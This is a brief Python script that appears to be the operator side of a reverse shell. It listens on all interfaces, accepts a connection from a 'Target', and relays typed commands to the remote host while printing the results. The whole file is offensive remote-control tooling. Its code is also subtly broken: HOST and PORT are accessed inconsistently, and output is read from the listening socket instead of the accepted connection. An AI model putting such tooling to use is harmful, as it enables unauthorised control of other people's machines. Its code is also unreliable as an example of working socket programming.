import socket
from constant import *

soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

soc.bind((HOST["ANYWHERE"], PORT["CUSTOM"]))

soc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
soc.listen(5)
print(f"Listening in {HOST.ANYWHERE}:{PORT.CUSTOM}")

sock, addr = soc.accept()
print(f"Target: {addr[0]}:{addr[1]}")

pwd = sock.recv(BUFFER_SZ).decode()
print("[+] PWD: ", pwd)

while True:
    cmd = input(f"{pwd} $> ")
    if not cmd.strip():
        continue
    sock.sendall(cmd.encode())

    match cmd.lower():
        case "exit":
            break

    output = soc.recv(BUFFER_SZ).decode()
    print("output: ", output)
    res, pwd = output.split(SEPERATOR)
    print(res)

sock.close()
soc.close()
